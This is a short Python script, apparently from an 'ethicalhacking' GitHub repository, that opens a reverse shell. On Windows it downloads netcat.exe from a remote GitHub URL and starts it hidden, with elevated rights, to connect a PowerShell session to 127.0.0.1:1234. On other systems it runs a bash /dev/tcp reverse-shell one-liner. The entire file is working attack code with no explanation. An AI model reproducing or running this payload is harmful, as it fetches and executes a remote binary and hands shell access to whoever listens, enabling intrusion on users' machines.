# Code written by https://github.com/Sajmonpcgamer

import sys
import os

if "win" in sys.platform:
    os.system("powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/Sajmonpcgamer/ethicalhacking/main/netcat.exe -OutFile .\\nc.exe ; Start-Process \\nc.exe -ArgumentList \"127.0.0.1 1234 -e powershell\" -WindowStyle Hidden -Verb RunAs")
else:
    os.system("bash -i >& /dev/tcp/127.0.0.1/1234 0>&1")